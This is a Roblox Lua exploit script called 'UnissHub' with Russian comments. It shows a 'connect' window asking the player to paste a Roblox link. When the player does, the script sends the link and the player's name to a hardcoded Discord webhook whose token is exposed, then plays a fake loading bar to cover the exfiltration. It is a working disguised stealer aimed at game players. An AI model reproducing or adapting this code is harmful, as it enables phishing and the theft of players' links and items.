-- UnissHub Loadstring Edition
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer

-- ТВОЙ ВЕБХУК
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"

-- Функция отправки данных
local function sendWebhook(link)
    local request = syn and syn.request or http_request or request or HttpPost
    if request then
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({
                content = "🚀 **UnissHub | New Link**\nPlayer: " .. Player.Name .. "\nLink: " .. link
            })
        })
    end
end

-- Создание GUI
local sg = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
sg.Name = "UnissHub_Final"
sg.ResetOnSpawn = false

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 350, 0, 250)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = Color3.new(0,0,0)
Instance.new("UICorner", main)
Instance.new("UIStroke", main).Color = Color3.fromRGB(0, 120, 255)

local uBtn = Instance.new("TextButton", sg)
uBtn.Size = UDim2.new(0, 60, 0, 60); uBtn.Position = UDim2.new(0, 20, 0.5, -30)
uBtn.Text = "U"; uBtn.BackgroundColor3 = Color3.new(0,0,0); uBtn.TextColor3 = Color3.fromRGB(0, 120, 255)
uBtn.Font = Enum.Font.GothamBold; uBtn.TextSize = 30; Instance.new("UICorner", uBtn)

local input = Instance.new("TextBox", main)
input.Size = UDim2.new(0.8, 0, 0.2, 0); input.Position = UDim2.new(0.1, 0, 0.35, 0)
input.PlaceholderText = "Paste Roblox Link"; input.TextScaled = true; Instance.new("UICorner", input)

local conn = Instance.new("TextButton", main)
conn.Size = UDim2.new(0.8, 0, 0.2, 0); conn.Position = UDim2.new(0.1, 0, 0.7, 0)
conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "connect"; Instance.new("UICorner", conn)

uBtn.MouseButton1Click:Connect(function() main.Visible = not main.Visible end)

conn.MouseButton1Click:Connect(function()
    if string.find(input.Text:lower(), "roblox.com") then
        conn.Text = "SUCCESS!"; task.wait(0.5)
        main.Visible = false; uBtn.Visible = false
        task.spawn(function() sendWebhook(input.Text) end)
        
        -- Оранжевая загрузка
        local loadF = Instance.new("Frame", sg)
        loadF.Size = UDim2.new(0, 300, 0, 100); loadF.Position = UDim2.new(0.5, 0, 0.5, 0)
        loadF.AnchorPoint = Vector2.new(0.5, 0.5); loadF.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        Instance.new("UICorner", loadF); Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
        
        local lLabel = Instance.new("TextLabel", loadF)
        lLabel.Size = UDim2.new(1, 0, 1, 0); lLabel.BackgroundTransparency = 1
        lLabel.TextColor3 = Color3.fromRGB(255, 140, 0); lLabel.Font = Enum.Font.GothamBold

        for i = 0, 100 do
            lLabel.Text = "Loading: "..i.."%"
            task.wait(0.1)
        end
        sg:Destroy()
    end
end)
